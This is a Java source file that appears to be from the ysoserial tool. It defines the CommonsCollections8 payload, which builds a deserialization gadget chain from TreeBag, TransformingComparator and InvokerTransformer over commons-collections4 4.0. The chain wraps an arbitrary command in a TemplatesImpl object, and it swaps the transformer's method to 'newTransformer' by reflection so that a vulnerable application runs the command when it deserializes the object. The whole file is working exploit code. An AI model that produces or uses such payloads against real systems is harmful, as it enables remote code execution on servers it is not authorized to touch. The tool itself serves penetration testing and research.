package ysoserial.payloads;

import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({"navalorenzo"})
public class CommonsCollections8 extends PayloadRunner implements ObjectPayload<TreeBag> {
    public CommonsCollections8() {
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections8.class, args);
    }

    public TreeBag getObject(String command) throws Exception {
        Object templates = Gadgets.createTemplatesImpl(command);
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        TransformingComparator comp = new TransformingComparator(transformer);
        TreeBag tree = new TreeBag(comp);
        tree.add(templates);
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
        return tree;
    }
}
